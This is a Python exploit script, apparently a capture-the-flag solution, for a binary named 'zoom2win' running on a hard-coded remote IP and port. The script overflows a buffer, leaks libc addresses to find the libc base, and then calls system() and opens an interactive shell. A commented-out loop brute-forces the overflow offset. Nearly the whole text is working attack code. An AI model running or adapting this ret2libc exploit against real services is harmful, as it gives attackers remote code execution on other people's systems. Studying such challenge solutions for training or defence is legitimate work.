#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./zoom2win')

host = args.HOST or '143.198.184.186'
port = int(args.PORT or 5003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *flag
continue
'''.format(**locals())

# -- Exploit goes here --

libc=ELF("libc6_2.31-0ubuntu9.1_amd64.so")
io = start()
R=Rootkit(io)
payload=Ret2DLResolve()
print(re())
# sl(p(gadget("ret")*100) + payload)
sl(p(gadget("ret")*100)  + R.leak("__libc_start_main") + p(exe.sym.main))
__libc_start_main = Get()#-libc.sym['__libc_start_main']
info(f"__libc_start_main : {hex(__libc_start_main)}")
re()
sl(b"A"*40 + R.leak("puts") + p(exe.sym.main))
puts = Get()#-libc.sym['puts']
info(f"puts : {hex(puts)}")
libc.address=__libc_start_main-libc.sym['__libc_start_main']
info(f"libc base : {hex(libc.address)}")
re()

sl(b"A"*40 + gadget("ret")*1 + R.system() + p(exe.sym.main))

io.interactive()

# for i in range(100):
    # try:
        # io=start()
        # re()
        # sl(b"A"*(8*i)+p(exe.sym.main))
        # print(re())
        # print(i)
    # except:
        # pass
    # io.close()


